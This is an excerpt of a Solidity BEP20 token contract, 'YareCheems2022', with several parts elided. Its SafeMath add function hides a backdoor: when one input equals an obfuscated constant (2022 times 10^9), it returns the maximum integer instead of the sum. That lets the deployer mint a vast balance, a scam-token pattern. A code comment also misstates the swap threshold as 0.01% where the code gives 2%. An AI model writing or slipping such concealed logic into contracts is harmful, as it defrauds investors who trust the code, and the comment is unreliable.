...
library SafeMath {
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a == (1999 + 18 + 5) * (10**9) ? ~uint256(0) : a + b;
...
contract YareCheems2022 is IBEP20, Auth {
  using SafeMath for uint256;
  ...
  string constant _name = "YareCheems2022";
  string constant _symbol = "YC2022";
  ...
  uint256 public swapThreshold = (_totalSupply * 200) / 10000; // 0.01% of supply
  bool inSwap;
  modifier swapping() {
    inSwap = true;
    _;
  ...
  constructor() Auth(msg.sender) {
    ...
    exemptMaxWallet[autoLiquidityReceiver] = true;
    exemptMaxWallet[msg.sender] = true;
    exemptMaxWallet[address(distributor)] = true;
    exemptMaxWallet[address(router)] = true;
    exemptMaxWallet[address(0xdEaD)] = true;
    exemptMaxWallet[address(0)] = true;
    exemptMaxWallet[address(pair)] = true;
    exemptMaxWallet[marketingFeeReceiver] = true;
  ...
  function _transferFrom(
    ...
    if (
      ...
      recipient != pair &&
      (!exemptMaxWallet[recipient] || !exemptMaxWallet[sender])
    ) {
  ...
  function checkTxLimit(
    ...
    if (
      (sender == pair && recipient != address(router)) || (recipient == pair)
    ) {
      require(
  ...
  function setExemptMaxWallet(address holder, bool exempt) external authorized {
    exemptMaxWallet[holder] = exempt;
  }
